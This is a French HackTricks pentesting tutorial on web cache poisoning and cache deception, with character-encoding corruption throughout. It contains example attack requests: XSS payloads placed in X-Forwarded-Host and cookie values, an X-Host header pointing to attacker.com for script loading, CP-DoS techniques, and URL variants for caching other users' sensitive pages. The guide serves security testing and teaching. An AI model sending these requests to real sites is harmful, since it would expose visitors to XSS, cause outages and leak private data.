# Empoisonnement du cache et Tromperie de cache

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire et **automatiser des workflows** gr√¢ce aux outils communautaires **les plus avanc√©s**.\
Acc√©dez-y d√®s aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## La diff√©rence

> **Quelle est la diff√©rence entre l'empoisonnement du cache web et la tromperie de cache web ?**
>
> * Dans l'**empoisonnement du cache web**, l'attaquant am√®ne l'application √† stocker un contenu malveillant dans le cache, et ce contenu est servi depuis le cache aux autres utilisateurs de l'application.
> * Dans la **tromperie de cache web**, l'attaquant am√®ne l'application √† stocker un contenu sensible appartenant √† un autre utilisateur dans le cache, et l'attaquant r√©cup√®re ensuite ce contenu depuis le cache.

## Empoisonnement du cache

L'objectif de l'empoisonnement du cache est de faire en sorte que les **clients chargent des ressources inattendues partiellement ou contr√¥l√©es par l'attaquant**.\
La r√©ponse empoisonn√©e ne sera servie qu'aux utilisateurs qui visitent la page affect√©e pendant que le cache est empoisonn√©. Par cons√©quent, l'impact peut varier de non-existant √† massif selon que la page est populaire ou non.

Pour r√©aliser une attaque d'empoisonnement du cache, vous devez d'abord **identifier les entr√©es non cl√©s** (param√®tres qui n'ont pas besoin d'appara√Ætre dans la requ√™te mise en cache mais qui changent la page retourn√©e), voir **comment abuser** de ce param√®tre et **faire en sorte que la r√©ponse soit mise en cache**.

### D√©couverte : V√©rifier les en-t√™tes HTTP

Habituellement, lorsqu'une r√©ponse a √©t√© **stock√©e dans le cache**, il y aura un **en-t√™te indiquant cela**, vous pouvez v√©rifier quels en-t√™tes vous devriez surveiller dans ce post : [**En-t√™tes de cache HTTP**](../network-services-pentesting/pentesting-web/special-http-headers.md#cache-headers).

### D√©couverte : Mise en cache du code 400

Si vous pensez que la r√©ponse est stock√©e dans un cache, vous pourriez essayer d'**envoyer des requ√™tes avec un mauvais en-t√™te**, qui devrait √™tre r√©pondu par un **code de statut 400**. Ensuite, essayez d'acc√©der √† la requ√™te normalement et si la **r√©ponse est un code de statut 400**, vous savez qu'elle est vuln√©rable (et vous pourriez m√™me r√©aliser un DoS).\
Un en-t√™te mal configur√© pourrait √™tre juste `\:` comme en-t√™te.\
_Notez que parfois ces types de codes de statut ne sont pas mis en cache, donc ce test sera inutile._

### D√©couverte : Identifier et √©valuer les entr√©es non cl√©s

Vous pourriez utiliser [**Param Miner**](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943) pour **forcer les param√®tres et les en-t√™tes** qui peuvent √™tre **en train de changer la r√©ponse de la page**. Par exemple, une page peut utiliser l'en-t√™te `X-Forwarded-For` pour indiquer au client de charger le script √† partir de l√† :
```markup
<script type="text/javascript" src="//<X-Forwarded-For_value>/resources/js/tracking.js"></script>
```
### Provoquer une r√©ponse nuisible du serveur back-end

Avec le param√®tre/en-t√™te identifi√©, v√©rifiez comment il est **sanitis√©** et **o√π** il se **refl√®te** ou affecte la r√©ponse de l'en-t√™te. Pouvez-vous l'exploiter d'une mani√®re ou d'une autre (r√©aliser un XSS ou charger un code JS que vous contr√¥lez ? r√©aliser un DoS ?...)

### Obtenir la mise en cache de la r√©ponse

Une fois que vous avez **identifi√©** la **page** qui peut √™tre exploit√©e, quel **param√®tre**/**en-t√™te** utiliser et **comment** l'**exploiter**, vous devez faire en sorte que la page soit mise en cache. Selon la ressource que vous essayez de mettre en cache, cela pourrait prendre du temps, vous devrez peut-√™tre essayer pendant plusieurs secondes.\
L'en-t√™te **`X-Cache`** dans la r√©ponse peut √™tre tr√®s utile car il peut avoir la valeur **`miss`** lorsque la requ√™te n'a pas √©t√© mise en cache et la valeur **`hit`** lorsqu'elle l'est.\
L'en-t√™te **`Cache-Control`** est √©galement int√©ressant pour savoir si une ressource est mise en cache et quand sera la prochaine fois que la ressource sera √† nouveau mise en cache : `Cache-Control: public, max-age=1800`\
Un autre en-t√™te int√©ressant est **`Vary`**. Cet en-t√™te est souvent utilis√© pour **indiquer des en-t√™tes suppl√©mentaires** qui sont trait√©s comme **faisant partie de la cl√© de cache** m√™me s'ils ne sont normalement pas cl√©s. Par cons√©quent, si l'utilisateur conna√Æt le `User-Agent` de la victime qu'il cible, il peut empoisonner le cache pour les utilisateurs utilisant ce `User-Agent` sp√©cifique.\
Un autre en-t√™te li√© au cache est **`Age`**. Il d√©finit le temps en secondes pendant lequel l'objet a √©t√© dans le cache proxy.

Lors de la mise en cache d'une requ√™te, soyez **prudent avec les en-t√™tes que vous utilisez** car certains d'entre eux pourraient √™tre **utilis√©s de mani√®re inattendue** comme **cl√©s** et la **victime devra utiliser ce m√™me en-t√™te**. Toujours **tester** un empoisonnement de cache avec **diff√©rents navigateurs** pour v√©rifier si cela fonctionne.

## Exemples d'exploitation

### Exemple le plus simple

Un en-t√™te comme `X-Forwarded-For` est refl√©t√© dans la r√©ponse non sanitis√©>\
Vous pouvez envoyer une charge utile XSS basique et empoisonner le cache afin que tout le monde qui acc√®de √† la page soit victime d'un XSS :
```markup
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"
```
_Notez que cela empoisonnera une requ√™te vers `/en?region=uk` et non vers `/en`_

### Utiliser l'empoisonnement du cache web pour exploiter les vuln√©rabilit√©s de gestion des cookies

Les cookies pourraient √©galement √™tre refl√©t√©s dans la r√©ponse d'une page. Si vous pouvez en abuser pour provoquer un XSS par exemple, vous pourriez √™tre capable d'exploiter le XSS chez plusieurs clients qui chargent la r√©ponse malveillante du cache.
```markup
GET / HTTP/1.1
Host: vulnerable.com
Cookie: session=VftzO7ZtiBj5zNLRAuFpXpSQLjS4lBmU; fehost=asd"%2balert(1)%2b"
```
Notez que si le cookie vuln√©rable est tr√®s utilis√© par les utilisateurs, les requ√™tes r√©guli√®res nettoieront le cache.

### Utilisation de plusieurs en-t√™tes pour exploiter les vuln√©rabilit√©s de l'empoisonnement du cache web <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

Parfois, vous aurez besoin d'**exploiter plusieurs entr√©es non cl√©s** pour pouvoir abuser d'un cache. Par exemple, vous pouvez trouver une **Redirection ouverte** si vous d√©finissez `X-Forwarded-Host` sur un domaine que vous contr√¥lez et `X-Forwarded-Scheme` sur `http`. **Si** le **serveur** **redirige** toutes les requ√™tes **HTTP** vers **HTTPS** et utilise l'en-t√™te `X-Forwarded-Scheme` comme nom de domaine pour la redirection. Vous pouvez contr√¥ler o√π la page est dirig√©e par la redirection.
```markup
GET /resources/js/tracking.js HTTP/1.1
Host: acc11fe01f16f89c80556c2b0056002e.web-security-academy.net
X-Forwarded-Host: ac8e1f8f1fb1f8cb80586c1d01d500d3.web-security-academy.net/
X-Forwarded-Scheme: http
```
### Exploitation avec un en-t√™te `Vary` limit√©

Si vous d√©couvrez que l'en-t√™te **`X-Host`** est utilis√© comme **nom de domaine pour charger une ressource JS** mais que l'en-t√™te **`Vary`** dans la r√©ponse indique **`User-Agent`**. Alors, vous devez trouver un moyen d'exfiltrer le User-Agent de la victime et empoisonner le cache en utilisant cet user agent :
```markup
GET / HTTP/1.1
Host: vulnerbale.net
User-Agent: THE SPECIAL USER-AGENT OF THE VICTIM
X-Host: attacker.com
```
### Exploitation du Cache Poisoning HTTP en abusant du HTTP Request Smuggling

Apprenez ici comment r√©aliser des [attaques de Cache Poisoning en abusant du HTTP Request Smuggling](http-request-smuggling/#using-http-request-smuggling-to-perform-web-cache-poisoning).

### Tests automatis√©s pour le Web Cache Poisoning

Le [Web Cache Vulnerability Scanner](https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner) peut √™tre utilis√© pour tester automatiquement le web cache poisoning. Il prend en charge de nombreuses techniques diff√©rentes et est hautement personnalisable.

Exemple d'utilisation : `wcvs -u example.com`

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire et **automatiser des workflows** aliment√©s par les outils communautaires **les plus avanc√©s** au monde.\
Obtenez l'acc√®s aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Exemples vuln√©rables

### Apache Traffic Server ([CVE-2021-27577](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27577))

ATS a transmis le fragment √† l'int√©rieur de l'URL sans le supprimer et a g√©n√©r√© la cl√© de cache en utilisant uniquement l'h√¥te, le chemin et la requ√™te (en ignorant le fragment). Ainsi, la requ√™te `/#/../?r=javascript:alert(1)` a √©t√© envoy√©e au backend comme `/#/../?r=javascript:alert(1)` et la cl√© de cache ne contenait pas la charge utile, seulement l'h√¥te, le chemin et la requ√™te.

### GitHub CP-DoS

Envoyer une mauvaise valeur dans l'en-t√™te content-type a d√©clench√© une r√©ponse 405 mise en cache. La cl√© de cache contenait le cookie, il √©tait donc possible d'attaquer uniquement les utilisateurs non authentifi√©s.

### GitLab + GCP CP-DoS

GitLab utilise des seaux GCP pour stocker du contenu statique. **GCP Buckets** prend en charge l'**en-t√™te `x-http-method-override`**. Il √©tait donc possible d'envoyer l'en-t√™te `x-http-method-override: HEAD` et de contaminer le cache pour qu'il retourne un corps de r√©ponse vide. Il pourrait √©galement prendre en charge la m√©thode `PURGE`.

### Rack Middleware (Ruby on rails)

Une application Ruby on Rails est souvent d√©ploy√©e aux c√¥t√©s du middleware Rack. Le code Rack ci-dessous prend la valeur de l'**`x-forwarded-scheme` et l'utilise comme sch√©ma de la requ√™te**.

![](<../.gitbook/assets/image (159) (2).png>)

Envoyer l'en-t√™te `x-forwarded-scheme: http` entra√Ænerait une redirection 301 vers le m√™me emplacement, ce qui provoquerait un DoS sur cette ressource comme dans cet exemple :

![](<../.gitbook/assets/image (166).png>)

L'application pourrait √©galement prendre en charge l'en-t√™te `X-forwarded-host` et rediriger l'utilisateur vers cet h√¥te, ce qui permettrait de charger des fichiers javascript depuis le serveur de l'attaquant :

![](<../.gitbook/assets/image (157) (2).png>)

### 403 et Storage Buckets

Auparavant, **Cloudflare** avait l'habitude de **mettre en cache** les r√©ponses **403**, donc l'envoi d'en-t√™tes d'**Autorisation incorrects** en essayant d'acc√©der √† **S3** ou **Azure Storage Blobs** expos√©s retournerait un 403 qui serait mis en cache. Cloudflare ne met plus en cache les r√©ponses 403, mais cela pourrait fonctionner avec d'autres proxies.

![](<../.gitbook/assets/image (171).png>)

### Injection de param√®tres cl√©s

Assez souvent, les caches sont configur√©s pour **inclure uniquement certains param√®tres GET dans la cl√© de cache**.

Par exemple, Fastly utilisant Varnish **a mis en cache le param√®tre `size`** dans la requ√™te, mais si vous envoyiez **√©galement** le param√®tre **`siz%65`** avec une mauvaise valeur, la **cl√© de cache** √©tait construite avec le param√®tre size **bien √©crit**, mais le **backend** utilisait la **valeur √† l'int√©rieur du param√®tre encod√© dans l'URL**.

![](<../.gitbook/assets/image (180).png>)

Encoder l'URL du second param√®tre `size` a fait en sorte qu'il soit ignor√© par le cache, mais utilis√© par le backend. Donner au param√®tre une valeur de 0 entra√Ænerait une erreur 400 Bad Request pouvant √™tre mise en cache.

### R√®gles de l'User Agent

En raison de la grande quantit√© de trafic g√©n√©r√©e par des outils comme FFUF ou Nuclei, certains d√©veloppeurs ont d√©cid√© de bloquer les requ√™tes correspondant √† leurs user-agents. Ironiquement, ces ajustements peuvent introduire des opportunit√©s de cache poisoning et de DoS non d√©sir√©es.

![](<../.gitbook/assets/image (167) (2).png>)

J'ai constat√© que cela fonctionnait sur plusieurs cibles, avec des user-agents de diff√©rents outils ou scanners.

### Champs d'en-t√™te ill√©gaux

Le format du nom d'en-t√™te est d√©fini dans [RFC7230](https://datatracker.ietf.mrg/doc/html/rfc7230) comme suit :

![](<../.gitbook/assets/image (175) (2).png>)

En th√©orie, si un nom d'en-t√™te contient des caract√®res autres que ceux list√©s dans **tchar**, il devrait √™tre rejet√© avec une erreur 400 Bad request. En pratique, cependant, les serveurs ne respectent pas toujours le RFC. La mani√®re la plus simple d'exploiter cette nuance √©tait de cibler Akamai qui n'√©carte pas les en-t√™tes invalides, mais les transmet et met en cache toute erreur 400 tant que l'en-t√™te cache-control n'est pas pr√©sent.

![](<../.gitbook/assets/image (163).png>)

Envoyer un en-t√™te contenant un caract√®re ill√©gal, `\`, provoquerait une erreur 400 Bad Request pouvant √™tre mise en cache. C'√©tait l'un des mod√®les les plus couramment identifi√©s tout au long de mes tests.

### Trouver de nouveaux en-t√™tes

[https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6](https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6)

## Cache Deception

L'objectif du Cache Deception est de faire en sorte que les clients **chargent des ressources qui vont √™tre sauvegard√©es par le cache avec leurs informations sensibles**.

Tout d'abord, notez que les **extensions** telles que `.css`, `.js`, `.png`, etc. sont g√©n√©ralement **configur√©es** pour √™tre **sauvegard√©es** dans le **cache**. Par cons√©quent, si vous acc√©dez √† `www.example.com/profile.php/nonexistent.js`, le cache stockera probablement la r√©ponse car il voit l'**extension** `.js`. Mais, si l'**application** r√©pond avec le contenu **sensible** de l'utilisateur stock√© dans _www.example.com/profile.php_, vous pouvez **voler** ces contenus d'autres utilisateurs.

Autres choses √† tester :

* _www.example.com/profile.php/.js_
* _www.example.com/profile.php/.css_
* _www.example.com/profile.php/test.js_
* _www.example.com/profile.php/../test.js_
* _www.example.com/profile.php/%2e%2e/test.js_
* _Utiliser des extensions moins connues comme_ `.avif`

Un autre exemple tr√®s clair peut √™tre trouv√© dans ce write-up : [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712).\
Dans l'exemple, il est expliqu√© que si vous chargez une page inexistante comme _http://www.example.com/home.php/non-existent.css_, le contenu de _http://www.example.com/home.php_ (**avec les informations sensibles de l'utilisateur**) va √™tre retourn√© et le serveur de cache va sauvegarder le r√©sultat.\
Ensuite, l'**attaquant** peut acc√©der √† _http://www.example.com/home.php/non-existent.css_ dans son propre navigateur et observer les **informations confidentielles** des utilisateurs qui ont acc√©d√© auparavant.

Notez que le **proxy de cache** doit √™tre **configur√©** pour **mettre en cache** les fichiers **en fonction** de l'**extension** du fichier (_.css_) et non en fonction du content-type. Dans l'exemple _http://www.example.com/home.php/non-existent.css_ aura un content-type `text/html` au lieu d'un type mime `text/css` (qui est attendu pour un fichier _.css_).

Apprenez ici comment r√©aliser des [attaques de Cache Deception en abusant du HTTP Request Smuggling](http-request-smuggling/#using-http-request-smuggling-to-perform-web-cache-deception).

## R√©f√©rences

* [https://portswigger.net/web-security/web-cache-poisoning](https://portswigger.net/web-security/web-cache-poisoning)
* [https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities](https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities)
* [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712)
* [https://youst.in/posts/cache-poisoning-at-scale/](https://youst.in/posts/cache-poisoning-at-scale/)
* [https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9](https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9)

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire et **automatiser des workflows** aliment√©s par les outils communautaires **les plus avanc√©s** au monde.\
Obtenez l'acc√®s aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
